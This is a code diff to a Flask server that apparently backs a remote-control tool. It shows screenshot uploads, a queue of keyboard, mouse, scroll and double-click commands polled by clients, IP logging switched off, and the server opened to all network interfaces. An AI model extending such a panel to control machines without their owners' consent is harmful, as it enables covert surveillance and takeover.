@@ -101,12 +101,12 @@ def command():
     global startTime
     global selected_user
     global spam
-    ip = request.headers.get('X-Forwarded-For')
-    with open(os.path.join(STATIC_FOLDER,"ip.txt"),"r") as file:
-        data = file.read()
-        if ip not in data:
-            with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
-                file.write(f"\nip : {ip} | count : 0\n[----------------------------------------------------------------]")
+    # ip = request.headers.get('X-Forwarded-For')
+    # with open(os.path.join(STATIC_FOLDER,"ip.txt"),"r") as file:
+    #     data = file.read()
+    #     if ip not in data:
+    #         with open(os.path.join(STATIC_FOLDER,"ip.txt"),"a") as file:
+    #             file.write(f"\nip : {ip} | count : 0\n[----------------------------------------------------------------]")
     if request.method == "POST":
         user = request.get_json()
         user = user.get("user")
@@ -402,25 +402,36 @@ def screenshot():
 		image = request.data
 	return "done"
 	
-@app.route("/control",methods=["GET","POST"])
+@app.route("/control", methods=["GET", "POST"])
 def control():
-	global control_data
-	if request.method == "POST":
-		data = request.get_json()
-		if data["type"] == "key":
-			control_data["type"] = "key"
-			control_data["btn"] = data["button"]
-		elif data["type"] == "click":
-			control_data["type"] = "mouse"
-			control_data["x"] = data["x"]
-			control_data["y"] = data["y"]
-			control_data["mouse"] = data["button"]
-			control_data["width"] = data["width"]
-			control_data["height"] = data["height"]
-		return "done"
-	if request.method == "GET":
-		data1 = control_data
-		control_data = {}
-		return jsonify(data1)
+    global control_data
+    if request.method == "POST":
+        data = request.get_json()
+        if data["type"] == "key":
+            control_data["type"] = "key"
+            control_data["btn"] = data["button"]
+        elif data["type"] == "click":
+            control_data["type"] = "mouse"
+            control_data["x"] = data["x"]
+            control_data["y"] = data["y"]
+            control_data["mouse"] = data["button"]
+            control_data["width"] = data["width"]
+            control_data["height"] = data["height"]
+        elif data["type"] == "scroll":
+            control_data["type"] = "scroll"
+            control_data["deltaY"] = data["deltaY"]
+        elif data["type"] == "dbclick":
+            control_data["type"] = "dbclick"
+            control_data["x"] = data["x"]
+            control_data["y"] = data["y"]
+            control_data["width"] = data["width"]
+            control_data["height"] = data["height"]
+        return "done"
+
+    if request.method == "GET":
+        data1 = control_data
+        control_data = {}
+        return jsonify(data1)
+    
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host="0.0.0.0")
